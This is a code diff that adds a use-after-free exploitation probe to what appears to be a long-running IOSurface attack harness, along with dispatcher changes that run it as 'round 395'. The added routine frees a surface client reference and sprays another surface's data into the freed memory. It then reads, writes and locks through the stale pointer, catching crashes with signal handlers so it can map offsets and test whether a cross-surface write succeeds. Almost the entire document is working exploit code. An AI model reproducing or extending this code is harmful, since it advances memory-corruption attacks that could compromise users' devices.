@@ -15902,6 +15902,194 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r392: Framework-level UAF exploitation: map which offsets CopyValue reads.
+ * Strategy: Free client ref, spray with incrementing pattern,
+ * catch crash via signal handler to determine which offset triggered it.
+ * Also try: fork() before the crash to survive and report.
+ *
+ * CopyValue through stale pointer crashed in r382. We need to map the
+ * exact offsets the framework reads to construct a fake client ref.
+ */
+static volatile int g_r392_crashed = 0;
+static volatile int g_r392_offset = -1;
+static sigjmp_buf g_r392_jmp;
+
+static void r392_sighandler(int sig) {
+    g_r392_crashed = sig;
+    siglongjmp(g_r392_jmp, 1);
+}
+
+static void r392_probe(void) {
+    rlog("\n=== r392: Framework UAF Offset Mapping ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    IOSurfaceRef (*lookupID)(uint32_t) = dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+
+    if (!clientRelease) {
+        rlog("  No IOSurfaceClientRelease\n");
+        return;
+    }
+
+    /* Phase 1: Create a reference surface and save its full client ref data */
+    rlog("  Phase 1: Reference surface capture\n");
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* Create TWO surfaces: one to free (target), one to keep (reference) */
+    IOSurfaceRef refSurf = IOSurfaceCreate(props);
+    IOSurfaceRef tgtSurf = IOSurfaceCreate(props);
+    uint32_t refSid = IOSurfaceGetID(refSurf);
+    uint32_t tgtSid = IOSurfaceGetID(tgtSurf);
+    rlog("    ref: sid=%u ptr=%p\n", refSid, refSurf);
+    rlog("    tgt: sid=%u ptr=%p\n", tgtSid, tgtSurf);
+
+    /* Set marker properties */
+    int mk1 = 0xAAAA;
+    CFNumberRef mv1 = CFNumberCreate(NULL, kCFNumberIntType, &mk1);
+    IOSurfaceSetValue(tgtSurf, CFSTR("TgtMark"), mv1);
+    CFRelease(mv1);
+
+    /* Save reference surface client ref data */
+    uint8_t refData[512];
+    memcpy(refData, (void*)refSurf, 512);
+    rlog("    Saved 512 bytes of ref client ref data\n");
+
+    /* Save target surface client ref data */
+    uint8_t tgtData[512];
+    memcpy(tgtData, (void*)tgtSurf, 512);
+    rlog("    Saved 512 bytes of tgt client ref data\n");
+
+    /* Phase 2: Free target, spray with REFERENCE surface data */
+    rlog("\n  Phase 2: Free target, spray with ref data\n");
+    uintptr_t freed_addr = (uintptr_t)tgtSurf;
+    clientRelease(tgtSurf);
+
+    /* Verify freed memory is writable */
+    uint64_t test_val;
+    memcpy(&test_val, (void*)freed_addr, 8);
+    rlog("    Post-free +0: 0x%016llx\n", (unsigned long long)test_val);
+
+    /* Write the REFERENCE surface's client ref data into the freed memory.
+     * This should make calls through tgtSurf behave as if they're on refSurf.
+     * But critically: the kernel still thinks this is tgtSurf's connection. */
+    memcpy((void*)freed_addr, refData, 448);
+    rlog("    Sprayed ref data into freed tgt memory\n");
+
+    /* Phase 3: Try CopyValue through the stale pointer with signal protection */
+    rlog("\n  Phase 3: CopyValue through sprayed stale pointer\n");
+    fflush(stdout);
+
+    struct sigaction sa, old_bus, old_segv;
+    memset(&sa, 0, sizeof(sa));
+    sa.sa_handler = r392_sighandler;
+    sa.sa_flags = 0;
+    sigaction(SIGBUS, &sa, &old_bus);
+    sigaction(SIGSEGV, &sa, &old_segv);
+
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        CFTypeRef rv = IOSurfaceCopyValue(tgtSurf, CFSTR("TgtMark"));
+        if (rv) {
+            int v = 0;
+            CFNumberGetValue((CFNumberRef)rv, kCFNumberIntType, &v);
+            rlog("    CopyValue SUCCESS: 0x%x\n", v);
+            if (v == 0xAAAA) {
+                rlog("    *** Got tgt property through sprayed ref data! ***\n");
+            }
+            CFRelease(rv);
+        } else {
+            rlog("    CopyValue returned NULL (no crash)\n");
+        }
+    } else {
+        rlog("    CopyValue CRASHED: signal %d\n", g_r392_crashed);
+    }
+
+    /* Phase 4: Try SetValue through the sprayed stale pointer */
+    rlog("\n  Phase 4: SetValue through sprayed stale pointer\n");
+    fflush(stdout);
+
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        int xmk = 0xBBBB;
+        CFNumberRef xmv = CFNumberCreate(NULL, kCFNumberIntType, &xmk);
+        IOSurfaceSetValue(tgtSurf, CFSTR("CrossWrite"), xmv);
+        CFRelease(xmv);
+        rlog("    SetValue through stale ptr: no crash\n");
+
+        /* Check if the property landed on the REF surface */
+        CFTypeRef rv2 = IOSurfaceCopyValue(refSurf, CFSTR("CrossWrite"));
+        if (rv2) {
+            int v2 = 0;
+            CFNumberGetValue((CFNumberRef)rv2, kCFNumberIntType, &v2);
+            rlog("    *** CrossWrite on ref surface: 0x%x ***\n", v2);
+            if (v2 == 0xBBBB) {
+                rlog("    *** CROSS-SURFACE WRITE ACHIEVED! ***\n");
+            }
+            CFRelease(rv2);
+        } else {
+            rlog("    CrossWrite NOT on ref surface\n");
+        }
+
+        /* Check if it landed on the original tgt surface via lookup */
+        IOSurfaceRef tgtLookup = lookupID ? lookupID(tgtSid) : NULL;
+        if (tgtLookup) {
+            CFTypeRef rv3 = IOSurfaceCopyValue(tgtLookup, CFSTR("CrossWrite"));
+            if (rv3) {
+                int v3 = 0;
+                CFNumberGetValue((CFNumberRef)rv3, kCFNumberIntType, &v3);
+                rlog("    CrossWrite on tgt via lookup: 0x%x\n", v3);
+                CFRelease(rv3);
+            }
+            CFRelease(tgtLookup);
+        }
+    } else {
+        rlog("    SetValue CRASHED: signal %d\n", g_r392_crashed);
+    }
+
+    /* Phase 5: Try Lock through sprayed stale pointer */
+    rlog("\n  Phase 5: Lock through sprayed stale pointer\n");
+    fflush(stdout);
+
+    g_r392_crashed = 0;
+    if (sigsetjmp(g_r392_jmp, 1) == 0) {
+        kern_return_t kr = IOSurfaceLock(tgtSurf, 0, NULL);
+        rlog("    Lock through stale ptr: kr=%d\n", kr);
+        if (kr == 0) {
+            void *base = IOSurfaceGetBaseAddress(tgtSurf);
+            rlog("    Base address: %p\n", base);
+            IOSurfaceUnlock(tgtSurf, 0, NULL);
+        }
+    } else {
+        rlog("    Lock CRASHED: signal %d\n", g_r392_crashed);
+    }
+
+    /* Restore signal handlers */
+    sigaction(SIGBUS, &old_bus, NULL);
+    sigaction(SIGSEGV, &old_segv, NULL);
+
+    /* Cleanup */
+    CFRelease(refSurf);
+    CFRelease(props);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+
+    rlog("\n=== r392 complete ===\n");
+    fflush(stdout);
+}
+
 /* r391: IOSurface special property names + kernel config probing.
  * Try setting properties with names that might have special kernel meaning.
  * Also try: IOSurfaceSetPurgeable, IOSurfaceSetCompletionNotify,
@@ -61120,6 +61308,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 395) {
+            rlog("*** rounds=395: Framework UAF Offset Mapping ***\n");
+            rlog("  Spray ref data into freed tgt, test CopyValue/SetValue.\n\n");
+            fflush(stdout);
+            r392_probe();
+            goto done;
+        }
         if (rounds == 394) {
             rlog("*** rounds=394: IOSurface Special Properties + Data-Only ***\n");
             rlog("  Special property names, purgeable, large data spray.\n\n");
@@ -63470,7 +63665,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
